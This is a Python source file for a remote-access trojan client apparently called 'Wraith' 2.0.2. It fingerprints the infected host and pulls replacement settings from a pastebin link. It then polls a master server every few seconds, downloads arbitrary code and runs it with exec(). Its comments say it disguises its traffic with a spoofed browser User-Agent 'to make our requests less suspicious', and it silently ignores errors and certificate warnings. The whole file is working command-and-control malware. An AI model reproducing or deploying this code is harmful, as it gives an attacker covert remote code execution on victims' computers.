#!/usr/bin/python3

# Dependencies
import platform
import json
import time
import threading
import trace
import sys
import os
import psutil
import playsound
import pyttsx3
import subprocess
import ctypes
if platform.system() == "Windows": import pythoncom
from contextlib import contextmanager
from pypac import PACSession
from uuid import getnode
from datetime import datetime
from webbrowser import open as webopen
from requests.packages.urllib3 import disable_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from io import TextIOWrapper, BytesIO, SEEK_SET
from tkinter import messagebox, Tk
from zlib import crc32
from hashlib import md5
from base64 import b64encode
from cryptography.fernet import Fernet
from tempfile import SpooledTemporaryFile

# Func to get fingerprint of the hardware and software
def take_fingerprint():
    si = [] # System information
    si.append(platform.node())
    si.append(platform.architecture()[0])
    si.append(platform.architecture()[1])
    si.append(platform.processor())
    si.append(platform.system())
    si.append(platform.release())
    si.append(platform.version())
    if getnode() == getnode(): si.append(str(getnode())) # If the MAC cannot be read, a random one is returned. We want to avoid that.
    text = '#'.join(si)
    return str(crc32(text.encode()))

# Func to encrypt data to server
def encrypt(token, plaintext):
    # Add some data to the token to make it harder to decrypt messages
    token = str(token)+config["MASTER_CONNECTION_PORT"]+"thisisarandomstring//1342"
    token_md5 = md5()
    token_md5.update(token.encode())
    return Fernet(b64encode(token_md5.hexdigest().encode())).encrypt(plaintext.encode()).decode()

# Func to decrypt data from server
def decrypt(token, encrypted):
    # Add some data to the token to make it harder to decrypt messages
    token = str(token)+config["MASTER_CONNECTION_PORT"]+"thisisarandomstring//1342"
    token_md5 = md5()
    token_md5.update(token.encode())
    return Fernet(b64encode(token_md5.hexdigest().encode())).decrypt(encrypted.encode()).decode()

# Func to send stuff to the server
def send(path, headers): return requests.get("{}://{}:{}/{}".format(config["CONNECTION_PROTOCOL"],config["MASTER_SERVER_ADDRESS"],config["MASTER_CONNECTION_PORT"],path),headers=headers,verify=False)

# Func to parse the response from the server returning all useful data
def parse_response(response, decrypt_key):
    data_header = json.loads(response.headers["X-DATA"])
    encryption_used = data_header[0]
    data = data_header[1]
    if encryption_used: data = decrypt(decrypt_key,data)
    data = json.loads(data)
    status = data[0]
    packet_data = data[1]
    message = data[2]
    return status, packet_data, message

# Wrapper for send() and parse_response()
def sendw(path, headers, decryption, encryption=None):
    if not encryption == None: data_header = [1,encrypt(encryption,json.dumps(headers))]
    else: data_header = [0,json.dumps(headers)]
    data_header = json.dumps(data_header)
    request = send(path, {"X-DATA":data_header})
    status, data, message = parse_response(request, decryption)
    return status, data, message

# Function to override local config if online config exists and is set to not ignore
def update_config():
    global config
    try:
        new_config = requests.get(config["CONFIG_UPDATE_LINK"]).content.decode()
        new_config = json.loads(new_config)
        if new_config["IGNORE"]: raise
        config = new_config
    except: pass

# An error class to reload the wraith
class ReloadWraith(Exception): pass

# Disable insecure certificate warning
disable_warnings(InsecureRequestWarning)

# Set some variables
config = {}
config["CONFIG_UPDATE_LINK"] = "https://pastebin.com/raw/urlhere"
config["MASTER_SERVER_ADDRESS"] = "0.0.0.0"
config["MASTER_CONNECTION_PORT"] = "8000"
config["CONNECTION_PROTOCOL"] = "http"
config["STARTUP_EXEC_CODE"] = ""
WRAITH_VERSION = "2.0.2"
FINGERPRINT = take_fingerprint()
TOKEN = ""
requests = PACSession()
command_queue = []

# Set up the session to make our requests less suspicious
requests.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
    "Connection": "Keep-Alive",
    "Host": "{}:{}".format(config["CONNECTION_PROTOCOL"],config["MASTER_SERVER_ADDRESS"],config["MASTER_CONNECTION_PORT"]),
    "X-FINGERPRINT": FINGERPRINT,
})

update_config()

exec(config["STARTUP_EXEC_CODE"])

while True:
    time.sleep(3)
    try: # Ignore any errors. Keep going.
        status, data, message = sendw("login",{},FINGERPRINT)
        if status == 0:
            TOKEN = data
            status, data, message = sendw("getcode",{"X-TOKEN":TOKEN},TOKEN,TOKEN)
            code = data
            exec(code)
        elif status == 2:
            # If fails with 2 twice (we are rejected twice) give up
            time.sleep(5)
            status, data, message = sendw("login",{},FINGERPRINT)
            if status == 2: sys.exit(0)
            else:
                TOKEN = data
                status, data, message = sendw("getcode",{"X-TOKEN":TOKEN},TOKEN,TOKEN)
                code = data
                exec(code)
    except SystemExit: sys.exit(0)
    except: pass
